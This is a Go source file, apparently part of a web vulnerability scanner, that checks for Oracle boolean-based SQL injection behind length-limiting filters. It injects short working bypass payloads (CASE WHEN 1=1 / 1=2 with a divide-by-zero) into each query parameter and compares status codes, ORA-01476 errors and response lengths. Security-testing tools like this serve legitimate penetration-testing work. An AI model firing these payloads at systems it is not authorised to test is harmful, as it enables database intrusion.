package sqli

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"

	"github.com/yupiyy/bhyakugan/internal/core"
	"github.com/yupiyy/bhyakugan/internal/utils"
)

// ScanOracleLengthFilter attempts to detect Oracle SQLi where WAF/Filters block long payloads
func ScanOracleLengthFilter(baseURL string, client *http.Client, onFound func(core.Finding)) {
	// Only run if the URL has parameters
	if !strings.Contains(baseURL, "?") && !strings.Contains(baseURL, "&") {
		return
	}

	// 1. Establish Baseline
	respBase, err := client.Get(baseURL)
	if err != nil {
		return
	}
	baseBody, _ := io.ReadAll(respBase.Body)
	respBase.Body.Close()
	baseCode := respBase.StatusCode
	baseLen := len(utils.NormalizeBody(string(baseBody)))

	// 2. Check for Length Filter (Heuristic)
	// Send a long benign payload (150+ chars)
	longPadding := strings.Repeat("A", 150)
	longTarget := baseURL + "&bhyakugan_test=" + longPadding
	if strings.Contains(baseURL, "?") {
		longTarget = baseURL + "&bhyakugan_test=" + longPadding
	} else {
		longTarget = baseURL + "?bhyakugan_test=" + longPadding
	}

	respLong, errLong := client.Get(longTarget)
	if errLong == nil {
		defer respLong.Body.Close()
		// If Long Payload triggers 302/403/500/Error while Base is 200, it *might* be a length filter
		// The article mentions 302 Found as a symptom.
		if respLong.StatusCode != baseCode && (respLong.StatusCode == 302 || respLong.StatusCode == 403 || respLong.StatusCode == 500) {
			// Suspicious, proceed with optimized payload
		} else {
			// Even if no obvious filter, we still try the optimized payload as it's a valid Oracle Vector
		}
	}

	// 3. Shortest Boolean Payloads (from the article)
	// We need to inject this into existing parameters.
	// Payload: 'AND(CASE WHEN(1=1)THEN 1ELSE 1/0END)=1OR'1'='1

	// We iterate over params. For simplicity, we append to the URL (assuming one param or appending to query string works).
	// Ideally, we should parse query params. For now, we append `&id=` or inject into `?id=` if exists.

	payloadTrue := "'AND(CASE WHEN(1=1)THEN 1ELSE 1/0END)=1OR'1'='1"
	payloadFalse := "'AND(CASE WHEN(1=2)THEN 1ELSE 1/0END)=1OR'1'='1"

	// Construct Target (Inject into the first query param value or append)
	// Simple approach: Replace query params
	u, _ := url.Parse(baseURL)
	q := u.Query()

	for param := range q {
		originalVal := q.Get(param)

		// Test True
		q.Set(param, originalVal+payloadTrue)
		u.RawQuery = q.Encode()
		targetTrue := u.String()

		respT, errT := client.Get(targetTrue)
		if errT != nil {
			continue
		}
		bodyT, _ := io.ReadAll(respT.Body)
		respT.Body.Close()
		normBodyT := utils.NormalizeBody(string(bodyT))

		// Test False
		q.Set(param, originalVal+payloadFalse)
		u.RawQuery = q.Encode()
		targetFalse := u.String()

		respF, errF := client.Get(targetFalse)
		if errF != nil {
			continue
		}
		bodyF, _ := io.ReadAll(respF.Body)
		respF.Body.Close()
		normBodyF := utils.NormalizeBody(string(bodyF))

		// 4. Verification Logic
		// Logic: True Payload should be similar to Baseline (200 OK)
		//        False Payload should be Different (500 Error, or 1/0 error -> "Divide by zero")

		isConfirmed := false
		evidence := ""
		severity := "High" // Default for Boolean Blind without extraction

		// Check 1: Status Code Difference
		if respT.StatusCode == baseCode && respF.StatusCode != baseCode {
			isConfirmed = true
			evidence = fmt.Sprintf("Status Code Difference:\n- Baseline: %d\n- True Payload: %d\n- False Payload: %d", baseCode, respT.StatusCode, respF.StatusCode)
		}

		// Check 2: Oracle Error in False Response
		// 1/0 in Oracle raises "ORA-01476: divisor is equal to zero"
		if strings.Contains(string(bodyF), "ORA-01476") || strings.Contains(string(bodyF), "divisor is equal to zero") {
			isConfirmed = true
			// Error-based oracle confirmation is strong but still below direct data extraction.
			severity = "High"
			evidence = "Oracle Error (Divisor is equal to zero) triggered by False payload."
		}

		// Check 3: Length/Content deviation
		lenT := len(normBodyT)
		lenF := len(normBodyF)

		if !isConfirmed {
			// TRIPLE CHECK for Length Deviation
			// 1. True must be VERY similar to Baseline (< 2% diff)
			// 2. False must be SIGNIFICANTLY different from Baseline (> 5% diff)
			// 3. Repeat to ensure stability

			if isSimilarLengthStrict(lenT, baseLen) && !isSimilarLengthStrict(lenF, baseLen) {
				// Verify Stability
				vRespT, _ := client.Get(targetTrue)
				vRespF, _ := client.Get(targetFalse)
				if vRespT != nil && vRespF != nil {
					vLenT := getRespLen(vRespT)
					vLenF := getRespLen(vRespF)

					if isSimilarLengthStrict(vLenT, baseLen) && !isSimilarLengthStrict(vLenF, baseLen) {
						isConfirmed = true
						evidence = fmt.Sprintf("Stable Response Length Deviation (Triple Checked):\n- Baseline: %d bytes\n- True Payload: %d bytes\n- False Payload: %d bytes", baseLen, vLenT, vLenF)
					}
				}
			}
		}

		if isConfirmed {
			// Construct Detailed Evidence
			fullEvidence := fmt.Sprintf(`
Payload A (TRUE): %s -> HTTP %d (Len: %d)
Payload B (FALSE): %s -> HTTP %d (Len: %d)
Baseline: %s -> HTTP %d (Len: %d)
Conclusion: Boolean-based SQL Injection confirmed (Oracle Length Filter Bypass).
Reason: %s`,
				payloadTrue, respT.StatusCode, lenT,
				payloadFalse, respF.StatusCode, lenF,
				"Original Request", baseCode, baseLen,
				evidence)

			reportOracle(targetTrue, fullEvidence, severity, onFound)
			return
		}
	}
}

func getRespLen(r *http.Response) int {
	defer r.Body.Close()
	b, _ := io.ReadAll(r.Body)
	return len(b)
}

func isSimilarLengthStrict(a, b int) bool {
	if a == 0 || b == 0 {
		return false
	}
	diff := a - b
	if diff < 0 {
		diff = -diff
	}
	// Strict 2% tolerance for large pages
	return diff < (b / 50)
}

func reportOracle(target, evidence, severity string, onFound func(core.Finding)) {
	fmt.Printf("[!] POSITIVE MATCH: Oracle SQLi (Length Filter Bypass) at %s\n", target)
	onFound(core.Finding{
		Type:     "Oracle SQLi (Length Filter Bypass)",
		Target:   target,
		Detail:   fmt.Sprintf("Defeated Length Filter using Shortest Boolean Payload.\n%s", evidence),
		Severity: severity,
	})
}
